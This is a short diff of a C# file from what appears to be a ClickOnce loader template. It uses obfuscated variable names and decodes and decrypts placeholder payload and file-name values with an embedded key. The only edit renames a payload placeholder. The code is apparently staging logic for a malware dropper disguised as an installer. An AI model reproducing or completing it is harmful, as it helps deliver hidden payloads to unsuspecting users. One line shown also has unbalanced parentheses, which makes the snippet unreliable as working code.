@@ -27,7 +27,7 @@ namespace ClickOnceTemplate
         static IntPtr VAR8()
         {
             byte[] VAR9 = {[KEY]};
-				    byte[] VAR10 = Convert.FromBase64String(VAR60.VAR61("[URL_PAYLOAD]"));
+            byte[] VAR10 = Convert.FromBase64String(VAR60.VAR61("[PAYLOAD]"));
             byte[] VAR11 = Convert.FromBase64String(VAR60.VAR61("[FILENAME]"));
             string VAR103 = Encoding.ASCII.GetString(VAR16.VAR28(VAR9, VAR10);
             string VAR104 = Encoding.ASCII.GetString(VAR16.VAR28(VAR9, VAR11));
